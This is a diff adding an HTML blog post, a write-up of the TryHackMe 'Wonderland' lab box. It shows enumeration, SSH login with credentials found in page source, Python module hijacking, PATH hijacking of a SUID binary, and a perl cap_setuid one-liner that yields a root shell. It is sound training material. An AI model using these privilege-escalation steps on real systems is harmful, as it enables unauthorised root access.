@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="TryHackMe - Wonderland - WRITE-UP" /><meta property="og:locale" content="en" /><meta name="description" content="BOX NAME: Wonderland" /><meta property="og:description" content="BOX NAME: Wonderland" /><link rel="canonical" href="https://cloufish.github.io/blog/posts/Wonderland/" /><meta property="og:url" content="https://cloufish.github.io/blog/posts/Wonderland/" /><meta property="og:site_name" content="Cloufish’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-18T08:46:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TryHackMe - Wonderland - WRITE-UP" /><meta name="twitter:site" content="@Cloufisz" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"BOX NAME: Wonderland","url":"https://cloufish.github.io/blog/posts/Wonderland/","@type":"BlogPosting","headline":"TryHackMe - Wonderland - WRITE-UP","dateModified":"2021-06-11T19:18:37+02:00","datePublished":"2021-02-18T08:46:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://cloufish.github.io/blog/posts/Wonderland/"},"@context":"https://schema.org"}</script><title>TryHackMe - Wonderland - WRITE-UP | Cloufish's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Cloufish's Blog"><meta name="application-name" content="Cloufish's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" alt="avatar" class="mx-auto"> <img src="/blog/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/blog/">Cloufish's Blog</a></div><div class="site-subtitle font-italic">My own internet corner :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/blog/resources/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>RESOURCES TO LEARN HACKING</span> </a><li class="nav-item"> <a href="/blog/contribute/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>HELP ME WITH GITHUB PROJECTS</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Cloufish" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Cloufisz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cloufisz','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/blog/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/"> Posts </a> </span> <span>TryHackMe - Wonderland - WRITE-UP</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TryHackMe - Wonderland - WRITE-UP</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Bartholomew Mokrzycki </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Feb 18, 2021, 8:46 AM +0100" prep="on" > Feb 18 <i class="unloaded">2021-02-18T08:46:00+01:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 11, 2021, 7:18 PM +0200" prefix="Updated " > Jun 11 <i class="unloaded">2021-06-11T19:18:37+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1831 words">10 min</span></div></div><div class="post-content"><h2 id="box-name-wonderland">BOX NAME: <a href="https://tryhackme.com/room/wonderland">Wonderland</a></h2><h3 id="nmap">NMAP</h3><p><code class="language-plaintext highlighter-rouge">$ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.31.88</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>@
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-26 10:26 UTC
+Nmap scan report <span class="k">for </span>10.10.31.88
+Host is up <span class="o">(</span>0.042s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Golang net/http server <span class="o">(</span>Go-IPFS json-rpc or InfluxDB API<span class="o">)</span>
+|_http-title: Follow the white rabbit.
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>30.25 seconds
+</pre></table></code></div></div><p>We see the service is running http server, let’s check it: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/83Rv7hH.jpg" alt="index" /><br /> The main-page gives us a tip to <em>Follow the White Rabit</em> and also with “Curiouser and curiouser!” probably tells us to be… more curious ;p. Let’s proceed with enumeration and run Gobuster</p><h3 id="gobuster">GOBUSTER</h3><p><code class="language-plaintext highlighter-rouge">$ gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.31.88</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>/img <span class="o">(</span>Status: 200<span class="o">)</span>
+/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+/r <span class="o">(</span>Status: 200<span class="o">)</span>
+/poem <span class="o">(</span>Status: 200<span class="o">)</span>
+
+<span class="o">===============================================================</span>
+2021/01/26 10:32:39 Finished
+<span class="o">===============================================================</span>
+</pre></table></code></div></div><h3 id="exploring-the-web-directories">Exploring the Web directories</h3><p>Many good findings, let’s check them all!</p><h4 id="checking-img-directory">Checking /img directory</h4><p>in /img there’re the images for the web-app, I ran <code class="language-plaintext highlighter-rouge">strings</code> on them to see if there’s anything hidden:<br /> Nothing interesting in any of them, but I saw something strange in one of it - alice_door.png</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+</pre><td class="rouge-code"><pre>go:H
+-,,,,,,,,,,&lt;Y
+&amp;/y0
+iWmO
+NH&gt;@
+z++'5HGw
+^{mK#
+(wla
+~7i;
+Lt0zf
+w~zt
+#3 ?
+&lt;i&lt;Fwu
+t\_H1w
+_&lt;+og
+Nd}&amp;Yt
+a|XXXXXXXXXXX
+ L!8
+N/uc8
++^c^}
+)#]@
+_}2Zf
+t ~r^
+E[r7e
+A/hI
+C4])O
+yq&amp;f
+k@Zq
+#cN_`$
+|g3f2
+'\GWO
+U6}!
+[Nj&lt;
+tI_&gt;
+m.zh
+aaaaaaaaaaaaa
+hFai
+^p*|
+=8|rH
+&amp;q=C
+N~fX
+i\G;
+#~eT
+{hWX
+/GX;9{aH
+OLy8
+ZXXXx
+302L2
+930:
+T6'5z2
+z&gt;gOz
+y23eG
+tMWx
+QYpT
+/,,,,,,,,,,,|i
+vT/,,,&lt;f
+G       9+8
+!y"sd
+~l,_XXXXXXXXXXXx
+-,,,,&lt;L
+5'5,)&gt;s
+p;WFN
+snNp
+zaaaaaaaaaa
+</pre></table></code></div></div><p>There’re many lines where the same character is repeated many times. I wonder why is that.<br /> Let’s <em>continue on web-page directory browsing</em>. In <code class="language-plaintext highlighter-rouge">/r/</code> we see this page:<br /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/izC02Tm.png" alt="/r/" /><br /> “Would you tell me, please, which way I ought to go from here?”<br /> The keyword <strong>‘from here’</strong> catches my attention. Does it refer to <strong>recursive directory bruting?</strong> - Brute-Forcing that would start from <code class="language-plaintext highlighter-rouge">/r/</code> directory and then recursively brute-force new found directories. <em>Don’t know</em> - let’s see other directories.</p><p>In <code class="language-plaintext highlighter-rouge">/poem</code> we see - guess what! - a poem! <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/cq0SsuQ.png" alt="poem" /><br /> I’m non-english speaker, so poem is so enigmatic and so hard to read for me xD.<br /> This poem seems not important right now…</p><h3 id="recursive-brute-forcing">Recursive Brute-forcing</h3><p>Let’s try recursive brute-forcing! <code class="language-plaintext highlighter-rouge">gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.153.28/r/</code><br /> <strong>We find a directory called</strong> <code class="language-plaintext highlighter-rouge">/a/</code> - interesting!<br /> Let’s do that again with:<br /> <code class="language-plaintext highlighter-rouge">gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.153.28/r/a/</code><br /> And again we find a directory called <code class="language-plaintext highlighter-rouge">b</code>. Hah, is it then <code class="language-plaintext highlighter-rouge">/r/a/b/b/i/t/</code>? Let’s go there! <code class="language-plaintext highlighter-rouge">http://&lt;MACHINE_IP&gt;/r/a/b/b/i/t/</code><br /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/DBLtv8J.png" alt="rabbit" /><br /> So there’re two ‘directions’ we can take…</p><ol><li>Where Hatter lives.<li>Where March Hare lives.<br /> Also, we see in source code a hidden paragraph! <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/MXMyneN.png" alt="source-code" /> <strong>‘alice:HowDothTheLittleCrocodileImproveHisShiningTail’</strong><h3 id="logging-as-alice-with-ssh">Logging as alice with SSH</h3><p>This might be intepreted as the message, but it’s not. Notice that it’s in the <code class="language-plaintext highlighter-rouge">username:password</code> format (just like in /etc/passwd). So are these credentials to ssh server?<br /> <code class="language-plaintext highlighter-rouge">ssh alice@&lt;MACHINE_IP&gt;</code> and then input the password</p></ol><h3 id="privilege-escalations">Privilege Escalations</h3><h4 id="privilege-escalation-to-rabbit">Privilege Escalation to rabbit</h4><p>We log in! And there we see 2 files:</p><ul><li><code class="language-plaintext highlighter-rouge">root.txt</code> - For which we do not have any permissions<li><code class="language-plaintext highlighter-rouge">walrus_and_the_carpenter.py</code> - which contains another poem! ```python And this was odd, because it was “It’s very rude of him,” she said,</ul><p>The sands were dry as dry. No birds were flying over head — “That they could get it clear?” “I doubt it,” said the Carpenter, And shed a bitter tear. To give a hand to each.” Meaning to say he did not choose To leave the oyster-bed. And this was odd, because, you know, And scrambling to the shore.</p><p>Conveniently low:</p><p>“Before we have our chat; For some of us are out of breath, “No hurry!” said the Carpenter.</p><p>Are very good indeed — Now if you’re ready Oysters dear, We can begin to feed.”</p><p>“But not on us!” the Oysters cried, Turning a little blue, “After such kindness, that would be A dismal thing to do!” “The night is fine,” the Walrus said “Do you admire the view?</p><p>“It was so kind of you to come! And you are very nice!” The Carpenter said nothing but “Cut us another slice: I wish you were not quite so deaf — I’ve had to ask you twice!”</p><p>“It seems a shame,” the Walrus said, “To play them such a trick, After we’ve brought them out so far, And made them trot so quick!” The Carpenter said nothing but “The butter’s spread too thick!”</p><p>“I weep for you,” the Walrus said. “I deeply sympathize.” With sobs and tears he sorted out Those of the largest size. Holding his pocket handkerchief Before his streaming eyes.</p><p>“O Oysters,” said the Carpenter. “You’ve had a pleasant run! Shall we be trotting home again?” But answer came there none — And that was scarcely odd, because They’d eaten every one.””” “””</p><p>for i in range(10): line = random.choice(poem.split(“\n”)) print(“The line was:\t”, line)</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>
+Running
+```sudo -l```
+</pre></table></code></div></div><p>Matching Defaults entries for alice on wonderland: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</p><p>User alice may run the following commands on wonderland: (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>So we can only execute python3.6 and this one script... Which is a poem with imported module ```random```  
+When we execute this script with ```python3 walrus_and_the_carpenter.py``` we see it prints random 10 lines of this poem.  
+
+Is there a way we can't escalate privileges then? Yes there is.  
+We can create a file in the same directory where the script file is called ```random.py```, this way, instead of importing the actual ```random module``` python interpreter will import the file that we've created, and because the script ```walrus_and_the_carpenter.py``` is owned by root, we may have the possibility of privesc.
+
+Let's create random.py script with contents:
+```python
+import os
+
+os.system('/bin/bash')
+</pre></table></code></div></div><p>And execute the walrus script with</p><p><code class="language-plaintext highlighter-rouge">sudo -u root /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py </code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>[sudo] password for alice: &lt;alice_password&gt;
+Sorry, user alice is not allowed to execute '/usr/bin/python3.6 walrus_and_the_carpenter.py' as root on wonderland.
+</pre></table></code></div></div><p>Okay, so we can’t do that as root… Are there any other users in this machine? With <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> I see that there’s also:</p><ul><li>hatter<li>rabbit</ul><p>Let’s first try with hatter… It didn’t work either, but with <code class="language-plaintext highlighter-rouge">rabbit</code></p><p><code class="language-plaintext highlighter-rouge">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</code><br /> It works flawlessly.</p><h4 id="privilege-escalation-to-hatter">Privilege Escalation to hatter</h4><p>Okay so we’re user rabbit, but we’re still in the same directory as alice. When going to <code class="language-plaintext highlighter-rouge">/home/rabbit/</code> we see there’s a SUID binary there!</p><p>When executing it:</p><p><code class="language-plaintext highlighter-rouge">./teaParty </code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Tue, 26 Jan 2021 13:16:23 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+please
+Segmentation fault (core dumped)
+</pre></table></code></div></div><p>I’m not proficient with <em>Buffer Overflows</em>, but this looks exactly as ones.<br /> There’s always option of copying the file on ssh with <code class="language-plaintext highlighter-rouge">scp</code> command, which I’ll use to decompile this binary <code class="language-plaintext highlighter-rouge">scp alice@10.10.153.28:/tmp/teaParty teaParty</code>.</p><p>Not so proficient with Reverse Engineering too. Ghidra for instance didn’t detect main() function - don’t know why.<br /> Looking at the alternatives I stumbled upon <code class="language-plaintext highlighter-rouge">Cutter</code> - which uses Ghidra decompiler also, but it found the <code class="language-plaintext highlighter-rouge">main() function</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/5Pjd2ex.png" alt="decompiled" /><br /> Okay so we see that there’s one <code class="language-plaintext highlighter-rouge">system()</code> function that uses the <code class="language-plaintext highlighter-rouge">date</code> command - also without relative paths! So could we do the same thing as before? - With creating our own script with the same name (<code class="language-plaintext highlighter-rouge">date.sh</code>)? Yes!</p><p>But Linux system searches for the script to be executed with environment variable $PATH, let’s echo it and see:</p><p><code class="language-plaintext highlighter-rouge">echo $PATH </code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>/usr/local/sbin:
+/usr/local/bin:
+/usr/sbin:
+/usr/bin:
+/sbin:
+/bin:
+/snap/bin
+</pre></table></code></div></div><p>Let’s see if we have write access to any of it. Aaand, we don’t! So let’s export a directory <code class="language-plaintext highlighter-rouge">/tmp</code> into <code class="language-plaintext highlighter-rouge">$PATH variable</code></p><p><code class="language-plaintext highlighter-rouge">export PATH=/tmp:$PATH</code> - This way we place /tmp at the highest priority (before other directories), so the <code class="language-plaintext highlighter-rouge">date</code> script will be found <strong>before the real date</strong> binary</p><p>so with <code class="language-plaintext highlighter-rouge">vim /tmp/date</code> write</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>#!/bin/bash
+/bin/bash
+</pre></table></code></div></div><ul><li>The shebang is very important in executing scripts from PATH, especially if we’re removing the <code class="language-plaintext highlighter-rouge">.sh</code> extension from the name of the file.</ul><p>run <code class="language-plaintext highlighter-rouge">chmod +x /tmp/date</code> and then execute again teaParty. This will automatically login us to hatter user.</p><p>Running <code class="language-plaintext highlighter-rouge">id</code> gives us the output <code class="language-plaintext highlighter-rouge">hatter</code></p><h4 id="privilege-escalation-to-root">Privilege Escalation to root</h4><p>In his <code class="language-plaintext highlighter-rouge">/home/hatter</code> directory we see <code class="language-plaintext highlighter-rouge">password.txt</code>, and there’s probably root flag. Probably to root user.</p><p>The thing that is extremely strange to me, is that <code class="language-plaintext highlighter-rouge">root.txt</code> is in the <code class="language-plaintext highlighter-rouge">/home/alice</code> directory. It’s like it’s reversed.</p><h3 id="getting-the-user-flag">Getting the user flag</h3><p>executing <code class="language-plaintext highlighter-rouge">cat /root/user.txt</code> will give us the user flag… surprisingly…</p><p>With the (I hope) final privesc, let’s transfer <code class="language-plaintext highlighter-rouge">linpeas.sh</code> to the machine</p><p>I’ll be transfering linpeas.sh script for privesc by:</p><p><code class="language-plaintext highlighter-rouge">python -m http.server 8080</code> where you have linpeas.sh located.<br /> I want to wget get this file to /tmp directory, so I’ll cd into that<br /> <code class="language-plaintext highlighter-rouge">cd /tmp</code></p><p><code class="language-plaintext highlighter-rouge">wget http://&lt;YOUR_THM_IP&gt;:8080/linpeas.sh</code><br /> <code class="language-plaintext highlighter-rouge">chmod +x linpeas.sh</code></p><p>Before executing, we have to delete <code class="language-plaintext highlighter-rouge">date</code> from the tmp because it pauses the <code class="language-plaintext highlighter-rouge">linpeas.sh</code> scan.</p><p>This though is not possible, because it was created by <code class="language-plaintext highlighter-rouge">rabbit</code> user xDD. We might again try logging as the rabbit user, delete this file. But because I have hatter password, I’ll just terminate the machine and deploy it again.</p><p><code class="language-plaintext highlighter-rouge">./linpeas.sh</code><br /> We have many findings: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/1gUyFiT.png" alt="linpeas1" /> <strong>But more importantly:</strong> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/92ndhAE.png" alt="capabilities" /></p><p><strong>What are capabilities?</strong></p><blockquote><p>It’s a more secure SUID mechanism, where we split all possible privileged kernel calls into groups of related functionality, because of that in an attack scenario the attacker will only gain the assigned subset of capabilities, and not the access of the entire system</p></blockquote><blockquote><p>The problem with these capabilities on perl is that… there’s empty capability (you see <code class="language-plaintext highlighter-rouge">+ep</code>?). An empty capability set means that all the capabilities are enabled and the executable runs as the superuser.</p></blockquote><blockquote><p>This combined with cap_setuid capability gives a severe opportunity to escalate this privilege</p></blockquote><p>To use this <code class="language-plaintext highlighter-rouge">setuid+ep</code> capability, we can execute:</p><p><code class="language-plaintext highlighter-rouge">perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</code><br /> And with this, we’re logged as root. Viewing the flag in /alice/root.txt is now possible</p><h3 id="final-thoughts">Final Thoughts</h3><p>There was so many privilege escalations! And we learnt also about recursive directory bruting, and also decompiled binary to see what it’s actually doing!<br /> We seriously have <em>entered Wonderland</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/tryhackme/'>TryHackMe</a>, <a href='/blog/categories/wonderland/'>Wonderland</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/blog/tags/setuid-capabilities/" class="post-tag no-text-decoration" >setuid capabilities</a> <a href="/blog/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/blog/tags/path-privesc/" class="post-tag no-text-decoration" >$PATH privesc</a> <a href="/blog/tags/python-modules-privesc/" class="post-tag no-text-decoration" >python-modules-privesc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe - Wonderland - WRITE-UP - Cloufish's Blog&url=https://cloufish.github.io/blog/posts/Wonderland/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe - Wonderland - WRITE-UP - Cloufish's Blog&u=https://cloufish.github.io/blog/posts/Wonderland/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=TryHackMe - Wonderland - WRITE-UP - Cloufish's Blog&url=https://cloufish.github.io/blog/posts/Wonderland/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/blog/posts/Can-OWASP-ZAP-replace-Burp-Suite-Professional/">Can OWASP ZAP replace Burp Suite Professional?</a><li><a href="/blog/posts/OWASP-ZAP-as-a-great-fuzzing-tool/">OWASP-ZAP-Fuzzer is it a great alternative for Burp-Suite Intruder?</a><li><a href="/blog/posts/Setting-up-zap-scan-in-cicd-pipeline/">Setting up ZAP Scan in CI/CD pipeline</a><li><a href="/blog/posts/Setting-Up-Hashicorp-Vault-To-Manage-Github-Token/">Setting up Hashicorp Vault to manage our Github Token</a><li><a href="/blog/posts/Preventing-Insufficient-Logging-and-Monitoring/">Concept of Preventing Insufficient Logging & Monitoring</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/devsecops/">devsecops</a> <a class="post-tag" href="/blog/tags/beginner/">beginner</a> <a class="post-tag" href="/blog/tags/containers/">containers</a> <a class="post-tag" href="/blog/tags/docker/">docker</a> <a class="post-tag" href="/blog/tags/blog/">blog</a> <a class="post-tag" href="/blog/tags/cms/">cms</a> <a class="post-tag" href="/blog/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/blog/tags/owasp/">owasp</a> <a class="post-tag" href="/blog/tags/pentesting-lab/">pentesting lab</a> <a class="post-tag" href="/blog/tags/zaproxy/">zaproxy</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck 